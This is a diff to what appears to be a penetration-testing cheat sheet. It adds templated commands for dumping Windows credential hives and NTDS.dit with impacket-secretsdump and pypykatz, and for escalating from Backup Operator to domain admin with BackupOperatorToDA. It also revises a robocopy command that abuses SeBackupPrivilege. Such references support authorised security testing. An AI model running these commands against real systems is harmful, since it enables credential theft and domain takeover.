@@ -227,6 +227,8 @@ impacket-atexec -ts 'DOMAIN/USERNAME:PASSWORD@IP' 'COMMAND'
 # dumping NTLM hashs and Kerberos Keys
 impacket-secretsdump -ts 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-secretsdump -ts -just-dc-user 'USERNAME' -just-dc-ntlm 'DOMAIN/USERNAME:PASSWORD@IP'
+# local
+impacket-secretsdump -system SYSTEM -security SECURITY -sam SAM -ntds ntds.dit LOCAL
 ```
 - impacket-services
 - impacket-smbclient
@@ -419,6 +421,7 @@ openssl pkcs12 -in 'PFX' -nocerts -out privkey.pem -nodes
 ```sh
 puttygen 'PUTTY_PRIVATEKEY' -O private-openssh -o 'OUTPUT_PRIVATEKEY'
 ```
+- pypykatz ![GitHub Repo stars](https://img.shields.io/github/stars/skelsec/pypykatz?style=social)
 - responder ![GitHub Repo stars](https://img.shields.io/github/stars/lgandx/Responder?style=social)
 ```sh
 sudo responder -I 'INTERFACE' -v
@@ -438,6 +441,10 @@ sqlite> SELECT * FROM 'TABLE_NAME';
 
 ## windows
 - [AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt) ![GitHub Repo stars](https://img.shields.io/github/stars/VbScrub/AdSyncDecrypt?style=social)
+- BackupOperatorToDA ![GitHub Repo stars](https://img.shields.io/github/stars/mpgn/BackupOperatorToDA?style=social)
+```powershell
+.\BackupOperatorToDA_x86.exe -t \\'COMPUTERNAME' -o 'FOLDER_PATH'
+```
 - cmd
 ```powershell
 # execute 64bit process on 32bit process
@@ -482,7 +489,7 @@ reg query "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares"
 - robocopy
 ```powershell
 # SeBackupPrivilege
-robocopy 'SOURCE DIRECTORY' 'DEST DIRECTORY' 'SOURCE FILE' /B /NFL /NDL /NJH /NJS
+robocopy 'SOURCE DIRECTORY' 'DEST DIRECTORY' 'SOURCE FILE' /b /np /njh /njs
 ```
 - rubeus ![GitHub Repo stars](https://img.shields.io/github/stars/GhostPack/Rubeus?style=social)
 ```powershell
